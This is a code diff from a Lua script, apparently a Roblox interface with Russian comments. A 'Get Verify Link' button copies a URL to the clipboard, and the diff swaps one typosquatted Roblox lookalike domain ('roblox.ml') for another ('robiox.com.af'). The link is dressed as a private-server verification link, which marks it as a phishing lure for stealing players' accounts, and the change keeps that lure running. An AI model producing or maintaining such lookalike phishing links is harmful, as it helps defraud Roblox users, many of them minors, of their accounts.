@@ -231,7 +231,7 @@ end
 
 -- Обработчик для кнопки Get Verify Link
 linkButton.MouseButton1Click:Connect(function()
-    local verifyLink = "https://roblox.ml/games/118910072174743/Get-Verified?privateServerLinkCode=69155647945445362618402496055839"
+    local verifyLink = "https://robiox.com.af/games/120769742485496/Get-Verified?privateServerLinkCode=69155647945445362618402496055839"
     copyToClipboard(verifyLink)
 end)
 
